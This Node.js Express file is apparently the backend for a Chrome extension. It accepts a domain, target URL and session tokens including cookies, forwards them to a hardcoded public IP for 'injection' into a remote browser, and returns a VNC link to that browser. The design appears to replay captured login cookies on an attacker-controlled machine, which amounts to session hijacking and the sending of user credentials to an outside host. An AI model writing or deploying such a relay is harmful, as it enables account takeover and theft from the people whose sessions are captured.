// vm-integration.js - Integration layer for Chrome extension to VM
const express = require('express');
const cors = require('cors');
const { spawn } = require('child_process');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));

const VM_SERVER = 'http://57.153.184.55:3000';
const VNC_BASE_URL = 'http://57.153.184.55:6080';

// Create session VM with token injection
app.post('/api/create-vm-session', async (req, res) => {
  try {
    const { domain, url, tokens } = req.body;
    
    console.log('🚀 Creating VM session for:', {
      tokenId: undefined,
      targetUrl: url,
      domain: domain,
      tokenCount: Object.keys(tokens || {}).length,
      cookieCount: Object.keys(tokens?.cookies || {}).length
    });
    
    // Generate unique session ID
    const sessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    // Forward to VM server for injection
  const vmResponse = await fetch(`${VM_SERVER}/inject`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      sessionData: {
        ...tokens,
        domain: domain
      },
      targetUrl: url
    })
  });
    
    if (!vmResponse.ok) {
      throw new Error(`VM injection failed: ${vmResponse.status}`);
    }
    
    const result = await vmResponse.json();
    
    const vmSession = {
      sessionId,
      vncUrl: `${VNC_BASE_URL}/vnc.html?autoconnect=true&resize=scale`,
      directUrl: `${VNC_BASE_URL}`,
      targetUrl: url,
      domain: domain,
      createdAt: new Date().toISOString(),
      expiresAt: new Date(Date.now() + (2 * 60 * 60 * 1000)).toISOString(), // 2 hours
      status: 'active',
      injectionResult: result
    };
    
    console.log('✅ VM session created successfully:', {
      sessionId: vmSession.sessionId,
      vncUrl: vmSession.vncUrl,
      targetUrl: vmSession.targetUrl
    });
    
    res.json({
      success: true,
      message: 'VM session created with injected tokens',
      session: vmSession
    });
    
  } catch (error) {
    console.error('❌ Error creating VM session:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Get VM session status
app.get('/api/vm-session/:sessionId', async (req, res) => {
  try {
    const { sessionId } = req.params;
    
    const response = await fetch(`${VM_SERVER}/session/${sessionId}`);
    
    if (response.ok) {
      const sessionData = await response.json();
      res.json({
        success: true,
        session: sessionData
      });
    } else {
      res.status(404).json({
        success: false,
        error: 'Session not found'
      });
    }
    
  } catch (error) {
    console.error('Error getting session status:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Test endpoint
app.get('/api/test-vm', async (req, res) => {
  try {
    const response = await fetch(`${VM_SERVER}/health`);
    const vmStatus = await response.json();
    
    res.json({
      success: true,
      message: 'VM connection successful',
      vmServer: VM_SERVER,
      vncUrl: VNC_BASE_URL,
      vmStatus
    });
    
  } catch (error) {
    res.status(500).json({
      success: false,
      error: 'Cannot connect to VM server',
      vmServer: VM_SERVER
    });
  }
});

const PORT = 3003;
app.listen(PORT, () => {
  console.log(`🔗 VM Integration API running on port ${PORT}`);
  console.log(`🖥️ VM Server: ${VM_SERVER}`);
  console.log(`📺 VNC Access: ${VNC_BASE_URL}`);
  console.log(`🧪 Test endpoint: http://localhost:${PORT}/api/test-vm`);
});

module.exports = app;
